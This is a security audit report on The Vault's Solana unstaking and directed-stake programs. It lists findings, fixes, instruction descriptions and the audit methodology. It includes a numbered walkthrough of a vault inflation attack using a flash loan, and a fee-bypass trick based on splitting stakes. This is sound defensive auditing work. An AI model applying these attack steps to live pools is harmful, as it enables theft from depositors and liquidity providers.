## Introduction

The audit focuses on The Vault protocol new programs:

- **liquid-unstaker** The Solana Unstaker program allows users to instantly unstake Liquid Staking Tokens (LSTs) or native SOL stake accounts. Liquidity providers deposit SOL into a pool and earn fees based on how much liquidity is availableâ€”lower fees when the pool is full and higher fees when liquidity is low. Users pay a fee to unstake instantly, and the program manages deactivating stake accounts and returning SOL to the pool as it becomes available. Administrators can set flexible fees and manage pools, a permissionless instruction is devoted to ensure pending stake accounts are returned to the vault.
- **directed-stake** Two programs that allow depositing of vSOL to a particular validator. Users get in exchange a DST
(Directed Stake Token) which is a wrapped vSOL. DST represents vSOL that is directed to a specific validator. This 
allows validators to establish their own directed LSTs (Liquid Staked Tokens).

The audit was conducted between October 31st, 2024 and November 19th, 2024. During this period, The Vault programs were thoroughly analyzed with particular attention paid to the vault structure and fee mechanisms, the deposit and withdrawal processes, and the interaction with Solana's Stake program. Several recommendations were made and communicated to the development team for future improvements.

This report outlines the audit process, describes the methodology used, and certifies the program as secure to the best of our knowledge while also highlighting areas for potential optimization and enhancement.

#### \[VAULT-01\] Vault Vulnerable to Inflation Attack

The Unstaker program contains a vault implementation where users can deposit and withdraw SOL. When a user 
deposits SOL into it the program mints LP tokens in proportional amount. The following equation describes
how the LP token amount to be minted is calculated:

Inputs:
- `LPt` - Total Supply of LP tokens.
- `Ld` - amount of Lamports user wishes to deposit.
- `L` - Total amount of lampots deposited at the pool.

Outputs:
- `LPm` - amount of LP tokens to mint.

if either `L` or `LPt` is zero.

`LPm = Ld + L - LPt`

if not:

`LPm = LPt * Ld / L`

The attacker by leveraging the fact that lamports can be sent to the `sol_vault` account directory can inflate 
the price of a single LP token. If the price is high enough the subsequent depositors will have their LP tokens
minted amount equal to zero because of rounding down of the value in the above equation.

Example Attack Scenario:
1. The Vault is deployed and initial balance of the `sol_vault` is `890880` (rent-exempt amaount).
2. The Attacker deposits `1` lamport and gets back `890881` LP tokens. The `sol_vault` balance is also `890881`.
3. The Attacker takes a flash loan of `793666283520` amaount (which is equal to `890880 * 890880 - 890880`). The purpose
of this loan is to inflate price of LP token to the point that all except one can be burned, but the amaount left in the 
`sol_vault` will guarantee rent-exempt. The amaount is transferred directly to the `sol_vault` and the Attacker burns `890880`
LP tokens. The balance of the `sol_vault` is now `890880` and the LP total supply is `1`.
4. Now The Attecker transfer `1` SOL to `sol_vault`. 
5. The Victim wants to deposit `1` SOL. The program calculates the amaount of LP tokens in the following way: `1 * 1000000000 / 1000890880`
which is equal to zero. The Victim deposited `1` SOL, but didn't get any LP. The Attacker with 1 LP token can withdraw entire `sol_vault` balance.

Proposed solutons:
- Introduce check that minting 0 LP tokens is not allowed.
- UniswapV2 style - locking fixed portion of LP tokens on first mint.
- OpenZeppelin style - decimal offset. [1]

#### [VAULT-02] The Linear Fee Can Be Bypassed by Splitting Stakes

The linear fee calculation inside the `calculate_base_fee` function is incorrect. The denominator in the following code snipped is `pool.min_sol_for_min_fee` which creates the relation of the fee percent based on the size of the unstaked amount:

```rust
            Ok(Fee::calculate_linear_base_fee(
                (pool.fee_max - pool.fee_min).into(),
                unstake_lamports, 
                pool.min_sol_for_min_fee)? + pool.fee_min as u64)
```

The fee percentage should however be a function of the balance left at the `sol_vault` account. The following example presents how the incorrect calculation can be abused to pay lower fees.

Inputs:
- `Fmin` - minimum fee
- `Fmax` - maximum fee
- `Smin` - minimum SOL value to initiate the linear fee calculation:
- `U`   - unstaked lamports

Outputs:
- `F` - linear fee percentage

`F = ((Fmax - Fmin) * U / Smin) + Fmin`

Now let's consider the following example, with values:
- `Fmin = 2%`
- `Fmax = 10%`
- `Smin = 2 SOL`
- `U = 1 SOL`

We are already below the `Smin`, but still enough to unstake `U`, our fee will look like this:

`F = ((10% - 2%) * 1 / 2) + 2% = 6%`

Now what happens if the user splits the stake in two, so the `U` will be `0.5 SOL`, but unstaked twice:

`F = ((10% - 2%) * 0.5 / 2) + 2% = 4%`

The impact of this issue is that the malicious user can split their larger stake account into two and unstake them one after the other (if the `Smin` threshold is crossed). This way such user would deprive the LP holders and the manager of the fees.

The calculation should be changed to:

`F = ((Fmax - Fmin) * U / Sb) + Fmin`

Where `Sb` is the `sol_vault` balance. Hence the correct code should look like this:

```rust
            Ok(Fee::calculate_linear_base_fee(
                (pool.fee_max - pool.fee_min).into(),
                unstake_lamports, 
                current_sol_vault_lamports)? + pool.fee_min as u64)
```

#### [VAULT-03] Shifting Deactivating Stakes Between Pools Blocks Funds Temporarily
When a user unstakes a stake account using a pool the program will end up owning Stake account which
holds the deactivating funds and a `StakeAccountInfo` - a special account holding information on the 
amount of deactivating funds with associated Stake account. While those accounts are owned by the 
Unstaker program, they are not associated with a concrete pool (and hence `sol_vault` account) that they 
were unstaked against. By shifting the withdrawals between pools (through the permissionless `update`
instruction) a mismatch between the Stake accounts may happen.

```
1. Starting point:
 # Pool A                          # Pool B
 #  deactivating: 1 SOL            #  deactivating: 0.5 SOL
 #  1 deactivating stake           #  1 deactivating stake
 #     - 1 SOL Stake A             #     - 0.5 SOL Stake B 

2. Stake B withdrawal is initiated on Pool A and we have the following situation:
 # Pool A                          # Pool B
 #  deactivating: 0.5 SOL          #  deactivating: 0.5 SOL
 #  1 deactivating stake           #  0 deactivating stakes
 #     - 1 SOL Stake A             #  

3. Now the Stake A is impossible to be withdrawn in neither of the pools.
```

The above situation can be recovered from if more Stake accounts are unstaked.

The proposed solution would be to add the Pool account to the `StakeAccountInfo` so that withdrawals can happen only on the pools where the Stake account was deactivated.

#### [VAULT-04] Inconsistency Between Unstaking Stake Account and LST Amounts

There is inconsistency between the following instruction when it comes to calculating the 
Fee and the unstaking payouts as per below code:

In `liquid_unstake_stake_account` instruction we have the following:
```rust
        Fee::calculate_and_transfer_fees(
            &mut ctx.accounts.pool, 
            &ctx.accounts.sol_vault, 
            &ctx.accounts.manager_fee_account,
            &ctx.accounts.user_sol_account,
            total_amount_to_unstake - stake_account_rent_exempt_amount)?;
```

while in `liquid_unstake_lst` we have:
```rust
        Fee::calculate_and_transfer_fees(
            &mut ctx.accounts.pool, 
            &ctx.accounts.sol_vault, 
            &ctx.accounts.manager_fee_account,
            &ctx.accounts.user_sol_account,
            total_amount_unstaked)?;
```

The `calculate_and_transfer_fees` should be passed with the `total_amount_to_unstake` value only ot `liquid_unstake_stake_account`, the rent-exempt amount shouldn't be deducted.

#### [VAULT-05] Unnecessary Check on the liquid_unstake_stake_account Instruction

The `liquid_unstake_stake_account` instruction shall initialize the following account to hold the unstaked 
information:
```rust
    #[account(
        //init_if_needed,
        init,
        seeds = [b"stake_account_info", stake_account.key().as_ref()],
        bump,
        payer = user,
        space = 8 + StakeAccountInfo::LEN,
    )]
    pub stake_account_info: Account<'info, StakeAccountInfo>,
```

Later in the instruction the following check on that account is performed:

```rust
        if ctx.accounts.stake_account_info.is_active {
            return Err(error!(LiquidUnstakerErrorCode::StakeAccountAlreadyProcessed));
        }
```
It is not necessary as the `stake_account_info` is initialized hence the above erroneous condition will never happen.

<a name="VAULT-06"></a>

#### [VAULT-06] Lack of Fee Input Controls

The Liquid Unstaker program lacks control of the values of the following parameters:
- `fee_max`
- `fee_min`
- `manager_fee_pct`

Those values on Initialize Pool and Update Pool instructions should be verified against a certain range according to the protocols policy to avoid abuse and mistakes.

<a name="VAULT-07"></a>

#### [VAULT-07] Unnecessary Bump Assignment

The Update Pool instruction on the Liquid Unstaker program contains unnecessary pool account bump retrieval and assignment:

```rust
        let (_pool_pda, pool_bump) = Pubkey::find_program_address(&[b"pool", pool.authority.as_ref()], ctx.program_id);
        pool.bump = pool_bump;
```

The `pool.bump` is already assignent during the Pool Initialization instruction and the bump does not change, hence the above code will just assign the same value wasting compute units. It can be safely removed.

## Protocol Overview

This section describes the functionality of The Vault protocol.

Solana Unstaker program facilitates instant unstaking for users holding Liquid Staking Tokens (LSTs) or native SOL stake accounts, while allowing liquidity providers to supply the necessary SOL and earn fees in return. Liquidity providers deposit SOL into a pool, receiving LP tokens representing their share, and earn variable fees based on the poolâ€™s liquidityâ€”lower fees when liquidity is sufficient and higher fees as liquidity decreases. Users can unstake LSTs or SOL stake accounts instantly, with fees deducted based on the poolâ€™s liquidity. The program also manages the lifecycle of deactivating stake accounts, withdrawing SOL as it becomes available, and returning it to the pool. Administrators configure pools with flexible fee and liquidity parameters and maintain them through periodic updates. Permissionless update instruction allows to load the pending stake accounts back to the vault. 

The second program directed-stake (actually a collection of two programs: directed-stake and directed-stake-token) allow the vSOL holder to deposit their vSOL and direct their stake into the a specific validator.

<a name="accounts-and-flows"></a>

### Accounts and Flows

The following graph describes the account structure of the directed-stake and directed-stake-token programs:

![DST Accounts](pics/the-vault-dst-accounts.png "DST Accounts")

The `DSTInfo` is the main account identifying the DST pool, it is tied to the following:
- `vsol_reserve` - account to hold deposited vSOL by stakers.
- `token_mint` - which is the mint account for the DST token.
- `director` - not directly tied but through the seed containing the `authority` of the `DSTInfo`.

The following graph describe the account structure of the liquid-unstaker program:

![Unstaker Accounts](pics/the-vault-unstaker-accounts.png "Unstaker Accounts")

The `Pool` is the main account identifying the Unstaker pool, it is tied to the following:
- `sol_vault` - account holding deposited SOL by the LP providers
- `lp_mint` - the LP token mint account used to mint the LP tokens for SOL depositors.

### Instructions

This section contains brief instruction description of the audited programs.

<a name="liquid-unstaker"></a>

#### Liquid Unstaker

**initialize_pool** 
- The program lets you create and configure Liquid Unstaking Pools with customizable settings for managing liquidity and fees.
- Each pool works independently, allowing multiple pools within the program.
- Configurable parameters include:
    - `fee_max`: Maximum fee percentage.
    - `fee_min`: Minimum fee percentage.
    - `min_sol_for_min_fee`: Minimum SOL required to apply the minimum fee.
    - `manager_fee_pct`: Percentage of fees for the pool manager.
- This setup provides flexibility and precise fee adjustments based on liquidity levels.

**deposit_sol**
- Liquidity providers add SOL to the pool to increase liquidity for unstaking.
- In return, they receive LP tokens, representing their share of the pool.
- LP tokens track contributions and rewards, encouraging providers to keep the pool liquid.
- The program securely issues LP tokens to reflect accurate participation.
- Depositors specify the amount of SOL they want to contribute.

**withdraw_sol**
- Liquidity providers can withdraw SOL by redeeming their LP tokens anytime.
- The withdrawal amount is based on their share of the pool and any earned fees.
- SOL payouts are adjusted dynamically to reflect the poolâ€™s state and rewards.
- This ensures fair compensation and transparency for providers.
- Depositors specify the amount of LP tokens they want to burn.

**liquid_unstake_lst**
- Users can instantly unstake their Liquid Staking Tokens (LSTs) and get SOL minus fees.
- The SPL Stake Pool program converts LSTs into an active stake account.
- The program deactivates the stake account and transfers the SOL to the user from the sol_vault.
- It keeps track of deactivated stake accounts using a `StakeAccountInfo` account tied to each stake and the pool, ensuring consistency and transparency.

The following picture presents the Flow of the Unstake LST instruction:
![Unstaker LST Flow](pics/the-vault-unstaker-lst-flow.png "Unstaker LST Flow")

**liquid_unstake_stake_account**
- This instruction lets users instantly unstake SOL from an active, delegated stake account without lockup restrictions.
- Users receive the SOL from the stake account minus fees.
- The StakeAccountInfo account links the stake account to the pool.

The following picture presents the Flow of the Unstake Stake Account instruction:
![Unstaker Stake Flow](pics/the-vault-unstaker-stake-flow.png "Unstaker Stake Flow")

**update**
- This permissionless instruction closes deactivated stake accounts and their linked StakeAccountInfo accounts.
- The released SOL is transferred to the sol_vault after the epoch ends.
- It should usually be run at the start of each epoch.

**update_pool**
- Only the pool authority can call the Update Pool instruction.
- It is used to update the poolâ€™s fee settings.

<a name="directed-stake-token"></a>

#### Directed Stake Token

**create_dst** 
- The instruction initializes a Directed Stake Token (DST) with specified parameters, establishing its core functionality and governance. 
- Key parameters include: 
    - `token_mint` - the DST's PDA mint account
    - `operator` - holds the ability to update the `partner`, `stake_target`, `base_fee`, and `operator_fee`
    - `stake_target`  - identifies the vote account for delegation and is modifiable by the `operator`.
    - `partner` - allows the validator to withdraw fees. 
- Fee structures include
    - `base_fee` - the base fee
    - `operator_fee`- percentage of the partner's fees.

**set_Stake_target** 
- Only the `operator` can call this instruction. 
- Sets the stake target, i.e. the validator to whom the deposited vSOL amount shall be staked.

**set_partner** 
- Only the `operator` can call this instruction. 
- Sets the `partner` address of the DST.

**set_base_fee** 
- Only the `operator` can call this instruction. 
- Sets the `base_fee` PCT of the DST

**set_operator_fee** 
- Only the `operator` can call this instruction. 
- Sets the `operator_fee` PCT of the DST

**burn** 
- Burns the DST for the underlying token. The DST is burned in the process, and vSOL will be instantly sent to the wallet specified by the caller.

**mint** 
- Mints a DST from vSOL. The DST will be minted to the wallet specified by the caller.

<a name="directed-stake"></a>

#### Directed Stake

**init_director** 
- Initializes the `Director` account. 
- The purpose of this account is to hold the stake target. 

**close_director** 
- Closes the `Director` account.

**set_stake_target** 
- Instruction sets the stake target account.

## Methodology
The security audit of The Vault protocol was conducted using a systematic and thorough approach to static code analysis. The primary focus of this audit was to assess the protocolâ€™s source code to identify vulnerabilities or potential risks, ensuring the safety and security of depositor assets. The methodology involved the following steps:
1. A comprehensive review of the program's source code was performed, emphasizing the functionality and logic related to the core features of The Vault. Particular attention was given to the management of funds, such as deposits, withdrawals, and fee calculations, to validate the correctness of these critical operations.
2. The program's logic was reviewed to confirm alignment with the intended operational specifications of The Vault. This included a detailed evaluation of scenarios where user assets interact with the protocol, such as stake delegation, fee collection, and fund deposits and withdrawals.
3. Attention was given to the protocol's use of Program Derived Addresses (PDAs) and account management to ensure secure handling of access to the program's critical accounts.
4. Any identified vulnerabilities or areas of concern were documented, categorized by severity, and supplemented with actionable recommendations for remediation. The emphasis was placed on providing practical advice to enhance the security posture of the protocol.
